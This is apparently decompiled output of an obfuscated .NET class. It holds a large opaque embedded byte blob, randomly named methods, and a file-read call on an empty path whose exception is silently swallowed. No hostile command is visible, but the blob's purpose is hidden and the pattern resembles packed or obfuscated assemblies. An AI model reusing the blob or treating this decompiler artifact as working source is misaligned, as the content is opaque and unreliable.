using System;
using System.IO;

namespace ns0;

internal sealed class Class0
{
	internal static N n_0/* Not supported: data(A5 5F 28 49 F5 5F 07 7B 7F F2 9C AE B7 46 A2 6E 32 4D 43 85 0E AB 91 E7 FF 48 F5 42 F8 A3 88 98 AF 44 AA 2E 7E C8 78 94 4C 7F 19 AF FE 66 30 C1 B4 89 45 E3 14 25 57 31 6B 64 09 52 82 CD CC 7D DF 38 CD 88 F0 49 AF F0 DA C4 75 8A A2 48 62 D4 9D 5F B1 37 79 CF FF A6 B8 E4 C7 8E FF 85 2D 20 C7 59 45 72 1E F9 FE D0 AE 57 AD 8A 77 B3 8B B0 28 E2 C3 9E 52 F1 39 0F 87 89 5F 15 37 0A 28 FB BF B7 42 2D B1 AE 31 C0 04 F9 47 B3 AC D3 38 BA 07 E6 1A F4 DB 34 9B 47 9E DF FD BF 77 DC EB FA 46 5D E7 04 8F D7 25 F2 E9 58 82 FC 1D 26 31 AE 54 D5 64 99 87 0E 17 26 21 99 68 39 DB 4A 3D 4A 79 2D 50 D4 3F EF 76 B7 15 E0 CC C5 28 27 7E A6 97 9E E6 3E F6 EA 92 63 D2 55 DC 6B EB D0 2A 22 4B C2 66 F6 F2 B1 A0 84 CF 3D 10 18 3F A2 3B BB 24 07 7F 00 DB EA 9F 5F C0 A4 95 AD 17 21 9E AC 3F A9 9C EA 21 1A 4E 0B BD D0 00 25 D6 1A 78 97 BD DD 10 31 8D 53 03 1A 8C 11 89 C2 5F 58 78 69 77 C8 5B EC CA 63 BA A2 75 87 39 C6 6E 0C 69 15 10 32 04 34 51 B0 95 DF F0 DA 88 C7 BE 01 00 F1 CE 1D 57 3E 52 BA 34 6B BB 51 9D C5 6C 51 4A 9D 8F DB 7A 1A E2 A6 BE 0C 81 C4 3C 88 AF A9 99 44 1E A8 63 81 26 97 64 B8 CB 49 5B 7E 29 25 04 E3 2D DE B8 04 3C D9 B9 9C AD 74 3F 3B 86 BC 35 16 52 2F 8C 62 33 FC 33 D3 37 08 2A ED BD 17 DA 02 EE 9A 7E C6 29 C7 FA 6C 57 1F AF FF E6 50 D3 A9 53 8A B8 6B 76 37 8D 59 61 30 58 49 35 A7 72 9F 2E 19 4C D7 05 8D 02 4D 60 EC B2 B4 9C 28 50 A0 F2 5D AC 90 6A DD F5 61 08 8C 7B D6 62 3C F3 BA A5 69 4C 94 75 1D 4B 83 30 B7 2D B8 AD C3 7D DE D1 B3 69 2F 65 12 F5 08 C9 03 F9 62 D2 E5 F8 E5 55 BB C0 5C 04 BA E9 30 24 60 B9 CA 79 16 3B E6 E2 9D D9 26 08 0F A9 8E 44 22 EF EE CB 1D D7 B3 56 2F 81 7C E6 EF 14 9C E3 2B EA 23 41 E8 FF 60 9E 13 87 AE 30 99 F7 BC 4D A2 A7 1F 87 9C F7 FA D9 AA 70 F7 9E A6 47 2F 76 1C 78 0B CF 5A EB 9E D3 7D 39 37 68 E5 56 90 25 A9 04 35 39 BC E0 C4 9D 11 8C 5E 9E D9 46 87 11 73 BE 49 15 BA 6B 97 7D 74 05 59 4A 1D 9B B1 89 31 80 59 EE 43 3A 7E 51 8A 10 14 CF E3 D2 2A 50 48 82 EE 61 97 DD 23 B1 21 FB 50 41 1E A9 F4 81 3E EB 57 D9 B7 99 DE 4D F2 4F D4 59 AB C0 43 07 46 40 15 E5 87 1A 61 5B 3D 33 0F C9 BA 6F C3 2C EE 33 A9 62 6D 52 24 4A F3 2D 67 04 06 15 95 34 51 66 91 8F 7C 1A 23 29 C7 C0 B5 94 65 16 22 7D 2B 6B C5 EA 58 92 1C 2A A1 B0 3E 4D BF 39 5D 26 AE 2D 00 33 38 10 75 29 8C B4 82 76 ED 1D 39 B8 33 F0 D3 B0 35 7D 78 98 E3 ED F9 5E 01 52 D7 E6 51 C4 22 65 8D E7 60 BF 57 3E 88 95 7C 46 90 AA AF CF 65 9D 35 EF 77 47 B6 36 9E 44 22 7C AF E4 E9 29 10 2A 76 1C F3 FA 2E F2 90 EB 08 7E CE EE A3 72 43 60 EF 38 F3 10 80 16 ED 7C 3E 8E 31 0C C4 96 81 AA CA 66 7E 49 B1 66 5E 79 05 E8 25 96 83 EB A7 65 C5 5A 26 16 4D 87 75 D4 82 80 95 AB B1 32 86 97 8E 6F D3 C3 83 40 0E 58 A8 F2 C0 D8 19 E5 BE F7 BC 4D 14 DC 98 5C 89 35 10 93 C2 52 27 0F 04 E1 B3 B0 34 8A D3 DD A3 31 FE 7E 8B AF 0A 42 50 86 6F 0D 87 8C CB 90 E2 68 81 66 2E 9C C0 E0 59 8C 41 DC F9 7E 5E 0C 6B C9 AD CB B5 3D D9 B8 09 8E 64 63 F2 6D A1 2B F1 0B 8D 38 FA B6 97 D1 02 06 FF 07 49 A5 C1 24 4E F5 C1 CE 0D 00 88 19 03 C0 C8 81 33 B9 9E 4B 21 64 F5 47 37 7D 3D 90 8E AF 53 FC 3E D0 47 58 16 14 64 44 BC 44 56 14 FE 72 5B D2 C9 4F 3F CE 0B 0F EA 82 19 35 C3 4C 75 56 EF BA C8 88 E3 61 38 C0 6C 78 72 E9 97 BD 33 DC 71 64 5B 4B A2 48 7A 12 17 F2 B7 52 14 47 2D) */;

	internal static char[] char_0;

	internal static byte[] data
	{
		get
		{
			try
			{
				return Class0.BiWzCpvNcKeibIsnLbcpBxnnetuVA("");
			}
			catch
			{
			}
			return new byte[0];
		}
	}

	internal static char smethod_0()
	{
		return 'a';
	}

	static Type SNzYFyJCVmObWSNHjjlFmDTXtsIQ(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static byte[] BiWzCpvNcKeibIsnLbcpBxnnetuVA(string string_0)
	{
		return File.ReadAllBytes(string_0);
	}
}
